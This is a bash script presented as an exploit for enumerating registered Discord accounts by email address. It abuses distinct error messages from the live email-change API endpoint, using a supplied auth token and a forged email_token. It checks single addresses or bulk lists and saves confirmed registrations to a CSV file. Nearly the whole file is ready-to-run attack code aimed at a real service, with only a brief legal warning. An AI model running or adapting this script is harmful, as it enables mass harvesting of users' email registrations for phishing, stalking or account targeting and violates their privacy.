#!/bin/bash

# Exploit: Discord Email Enumeration via Email Change Endpoint
# Author: Ar1sto (https://github.com/Ar1sto)
#
# Description:
# This script exploits an information disclosure vulnerability in Discord's email change endpoint,
# where the server returns distinct error messages depending on whether an email
# address is already registered.
#
# By sending a PATCH request with a forged email_token and a target email, the script determines:
# - If the email is already in use (based on the "EMAIL_ALREADY_REGISTERED" error),
# - If the token for testing is banned or invalid ("Unauthorized" response),
# - If a single email is checked, and is not registered, it is shown regardless of verbosity.
#
# With the --verbose flag, the script will show non-registered emails even when processing a list.
#
# Optionally, discovered emails can be saved to a CSV file.
#
# WARNING: Unauthorized use of this script may violate laws and Discord’s Terms of Service.

echo "==================================="
echo "         ┏┓  •  ┓ ┏┓┓   ┓ by Ar1sto"
echo "         ┗┓┏┓┓╋┏┣┓┃ ┃┓┏┏┫┏┓ ━━     "
echo "         ┗┛┛┗┗┗┗┛┗┗┛┗┗┫┗┻┗         "
echo " Discord Email Enumera┛ion Exploit "
echo "==================================="

usage() {
    echo "Usage: $0 --token AUTH_TOKEN [--email EMAIL | --list FILE] [--verbose] [--output FILE.csv] [--threads N]"
    exit 1
}

AUTH_TOKEN=""
EMAIL=""
LIST=""
VERBOSE=false
OUTPUT_FILE=""
THREADS=1

while [[ "$#" -gt 0 ]]; do
    case $1 in
        --token) AUTH_TOKEN="$2"; shift 2 ;;
        --email) EMAIL="$2"; shift 2 ;;
        --list) LIST="$2"; shift 2 ;;
        --verbose) VERBOSE=true; shift ;;
        --output) OUTPUT_FILE="$2"; shift 2 ;;
        --threads) THREADS="$2"; shift 2 ;;
        *) echo "[!] Unknown parameter: $1"; usage ;;
    esac
done

[[ -z "$AUTH_TOKEN" ]] && echo "[!] Missing --token" && usage
[[ -z "$EMAIL" && -z "$LIST" ]] && echo "[!] Provide --email or --list" && usage

if [[ -n "$OUTPUT_FILE" && ! -f "$OUTPUT_FILE" ]]; then
    echo "EMAIL, STATUS" > "$OUTPUT_FILE"
fi

check_email() {
    local email="$1"
    local index="$2"
    local total="$3"
    local response

    echo "[$index/$total] Checking $email ..."

    response=$(curl -s -X PATCH "https://discord.com/api/v9/users/@me" \
        -H "Authorization: $AUTH_TOKEN" \
        -H "Content-Type: application/json" \
        --data "{\"email\": \"$email\", \"email_token\": \"Clyde: LET ME TELL YOU SOMETHING!\"}")

    if [[ "$VERBOSE" == true ]]; then
        echo "[*] Raw Response for $email:"
        echo "$response"
    fi

    if echo "$response" | grep -q "EMAIL_ALREADY_REGISTERED"; then
        echo "[*] $email → E-Mail registered"
        [[ -n "$OUTPUT_FILE" ]] && echo "$email,registered" >> "$OUTPUT_FILE"
    elif echo "$response" | grep -q "Unauthorized"; then
        echo "[CRITICAL] $email → Session/Account banned"
        exit 1
    elif [[ -n "$EMAIL" || "$VERBOSE" == true ]]; then
        echo "[-] $email → E-Mail not registered"
    fi

    sleep 30
}

if [[ -n "$EMAIL" ]]; then
    check_email "$EMAIL" 1 1
    exit 0
fi

if [[ -n "$LIST" ]]; then
    mapfile -t emails < "$LIST"
    total=${#emails[@]}

    for i in "${!emails[@]}"; do
        index=$((i+1))
        email="${emails[$i]}"
        check_email "$email" "$index" "$total"
    done
fi
